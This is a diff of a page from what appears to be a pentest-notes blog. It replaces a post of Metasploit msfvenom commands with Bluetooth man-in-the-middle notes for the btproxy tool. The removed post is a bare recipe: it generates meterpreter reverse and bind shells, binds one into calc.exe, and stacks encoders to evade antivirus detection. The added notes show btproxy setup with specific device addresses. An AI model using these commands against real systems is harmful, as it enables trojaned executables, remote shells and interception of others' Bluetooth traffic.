@@ -786,21 +786,24 @@
   <div class="post-content">
     <header>
       
-        <time datetime="1912-12-01T00:00:00.000Z"><a href="/1912/12/01/MSFVENOM/">1912-12-01</a></time>
+        <time datetime="1912-12-01T00:00:00.000Z"><a href="/1912/12/01/Btproxy-Bluetooth/">1912-12-01</a></time>
       
       
   
-    <h1 class="title"><a href="/1912/12/01/MSFVENOM/">MSFVENOM</a></h1>
+    <h1 class="title"><a href="/1912/12/01/Btproxy-Bluetooth/">Btproxy-Bluetooth</a></h1>
   
 
     </header>
     <div class="entry">
-		<p>/usr/share/metasploit-framework/tools<br>cat payload_file.bin | ./msfvenom -p - -a x86 –platform win -e x86/shikata_ga_nai -f raw<br>msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe<br>PAYLOAD windows/meterpreter/reverse_tcp<br>$MSFVENOM -p “$PAYLOAD” LHOST=”$IP” LPORT=”$PORT” EXITFUNC=thread -f raw |<br>$MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2&gt;/dev/null |<br>$MSFVENOM -e x86/jmp_call_additive -i $ITER -a x86 –platform linux -f raw 2&gt;/dev/null |<br>$MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 –platform win -f raw 2&gt;/dev/null |<br>$MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 –platform win -f c &gt; msf.c 2&gt;/dev/null</p>
-<p> github/metasploitavevasion<br> 
+		<p>文章摘要<br>bluetooth sniffer /bluetooth pin linkkey cracker/ blueSoleil<br>python /usr/local/bin/bluez_simple_agent_nouser hci0  02:11:0F:19:15:57 02:11:0F:19:15:57<br>btproxy-&gt;mitm.py.restart_bluetoothd()-&gt;adapter.py._run(cmd)</p>
+<p>注销掉代码mitmpy.restart_bluetoothd()<br>dbus.exceptions.DBusException: org.freedesktop.DBus.Error.UnknownMethod: Method “FindAdapter” with signature “s” on interface “org.bluez.Manager” doesn’t exist</p>
+<p>bluez_simple_agent_nouser  nu 110 “org.bluez.Manager”<br>mitm.setup_adapters <if>alreadypaired restart_bluetoothd</p>
+<p>主/从设备都会使用蓝牙协议，直到主设备发出请求，从属设备通常保持待机状态。并且主设备可以连接到多台设备，而从属设备仅仅智能连接一台设备。<br>代理会搜寻设备名称和类，所以其可以将设备名称和类复制到使用的蓝牙适配器中。在本例中，因为只有一个蓝牙适配器，所以只会复制从属设备的属性。</p>
+<p>btproxy F4:8B:32:BA:0F:78 04:18:0F:19:35:57</p> 
     </div>
     <footer>
 		<div class="alignleft">
-		<a href="/1912/12/01/MSFVENOM/#more" class="more-link">Read more</a>
+		<a href="/1912/12/01/Btproxy-Bluetooth/#more" class="more-link">Read more</a>
 		</div>
         <div class="clearfix"></div>
     </footer>
@@ -818,7 +821,7 @@
     <aside id="sidebar" class="alignright">
   
 <div class="widget tag">
-  <h3 class="title">分类</h3>
+  <h3 class="title">Categories</h3>
   <ul class="entry">
   
     <li><a href="/categories/bluetooth/">bluetooth</a><small>2</small></li>
@@ -849,7 +852,7 @@
 
   
 <div class="widget tagcloud">
-  <h3 class="title">标签云</h3>
+  <h3 class="title">Tag Cloud</h3>
   <div class="entry">
     <a href="/tags/aircrack/" style="font-size: 10px;">aircrack</a> <a href="/tags/bash/" style="font-size: 10px;">bash</a> <a href="/tags/bluetooth/" style="font-size: 12.5px;">bluetooth</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/elf/" style="font-size: 12.5px;">elf</a> <a href="/tags/kali/" style="font-size: 12.5px;">kali</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/rtl-sdr/" style="font-size: 10px;">rtl-sdr</a> <a href="/tags/sqlmap/" style="font-size: 12.5px;">sqlmap</a> <a href="/tags/sqlmapapi/" style="font-size: 10px;">sqlmapapi</a> <a href="/tags/waf/" style="font-size: 10px;">waf</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/中医/" style="font-size: 15px;">中医</a> <a href="/tags/五行/" style="font-size: 10px;">五行</a> <a href="/tags/养生/" style="font-size: 12.5px;">养生</a> <a href="/tags/审计/" style="font-size: 10px;">审计</a> <a href="/tags/工控/" style="font-size: 10px;">工控</a> <a href="/tags/批量/" style="font-size: 10px;">批量</a> <a href="/tags/易经/" style="font-size: 10px;">易经</a> <a href="/tags/端口/" style="font-size: 10px;">端口</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a> <a href="/tags/绕过/" style="font-size: 10px;">绕过</a> <a href="/tags/重装/" style="font-size: 10px;">重装</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
   </div>
